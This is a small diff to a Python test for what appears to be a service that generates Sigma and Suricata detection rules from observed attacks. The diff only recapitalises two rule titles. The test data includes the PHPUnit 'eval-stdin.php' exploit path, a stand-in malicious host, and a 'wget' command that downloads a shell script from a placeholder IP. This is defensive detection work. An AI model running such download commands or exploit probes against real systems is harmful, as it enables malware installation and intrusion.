@@ -365,7 +365,7 @@ async def test_rules_are_generated_from_what_was_seen_and_marked_for_review(
     kinds = {r["kind"] for r in page["items"]}
     assert kinds == {"sigma", "suricata"} and page["total"] == len(page["items"])
     sigma_web = next(
-        r for r in page["items"] if r["id"] and "web requests seen with php2shell" in r["title"]
+        r for r in page["items"] if r["id"] and "Web requests seen with php2shell" in r["title"]
     )
     assert "/vendor/phpunit/src/eval-stdin.php" in sigma_web["text"]
     assert "Review before deploying" in sigma_web["text"]
@@ -375,7 +375,7 @@ async def test_rules_are_generated_from_what_was_seen_and_marked_for_review(
     assert hostile and all(r["text"].count("; sid:") == 1 for r in hostile)
     assert all("review before deploying" in r["text"] for r in suricata)
     assert any("dl.bad-host.example" in r["text"] for r in suricata)
-    cmd = next(r for r in page["items"] if "shell commands seen with malware-drop" in r["title"])
+    cmd = next(r for r in page["items"] if "Shell commands seen with malware-drop" in r["title"])
     assert "wget http://198.51.100.9/m.sh" in cmd["text"] and "'ls'" not in cmd["text"]
     paged = (await client.get(f"{API}/detections", params={"limit": 2})).json()
     assert len(paged["items"]) == 2 and paged["next_cursor"]
